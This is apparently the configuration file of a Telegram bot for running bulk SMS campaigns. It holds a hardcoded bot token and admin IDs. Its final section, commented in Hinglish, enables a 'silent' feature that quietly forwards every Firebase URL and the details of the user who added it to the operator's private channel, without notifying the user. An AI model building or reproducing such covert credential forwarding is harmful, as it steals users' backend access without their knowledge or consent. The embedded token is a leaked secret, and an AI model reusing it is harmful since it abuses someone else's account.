# ============================================================
# config.py — SMS Campaign Manager Bot Configuration
# ============================================================

# Telegram Bot Token (from @BotFather)
BOT_TOKEN = "9176469907:AAEnRL1arVytMF1izMUMuuCvB4TxGTcbaao"

# No default Firebase — each user adds their own via the bot

# Default delay in seconds between SMS dispatches per device
DEFAULT_SMS_DELAY = 2.0

# Admin Telegram IDs — these users get access to Admin Panel
# Example: [123456789, 987654321]
ADMIN_IDS = [8922842091]

# Authorized User IDs — empty list = allow everyone
# Example: [123456789] = only this user can use the bot
AUTHORIZED_USERS = []

# Max targets per campaign
MAX_TARGETS_PER_CAMPAIGN = 10000

# SQLite database path
DB_PATH = "sms_bot.db"

# Campaign ID prefix
CAMPAIGN_PREFIX = "CMP"

# ============================================================
# 🔒 PRIVATE LOG CHANNEL (silent Firebase forwarding)
# ------------------------------------------------------------
# Jab bhi koi user Firebase add karega (single ya bulk), uska URL + user
# details CHUP-CHAP (silent, bina notification) is channel par forward ho jayega.
#
# Setup:
#   1. Ek private channel banao.
#   2. Is bot ko us channel mein ADMIN banao (post messages permission).
#   3. Channel ka ID yahan daalo (jaise: -1001234567890).
#      - Channel ID nikalne ke liye channel mein koi message forward karo
#        @userinfobot ya @getidsbot ko, ya @username rakh ke "@yourchannel" use karo.
#
# FORWARD_FIREBASE_TO_CHANNEL = False rakhoge to feature band rahega.
# ============================================================
FORWARD_FIREBASE_TO_CHANNEL = True
LOG_CHANNEL_ID = "-1004380032004"   # e.g. -1001234567890  (ya "@yourchannelusername")

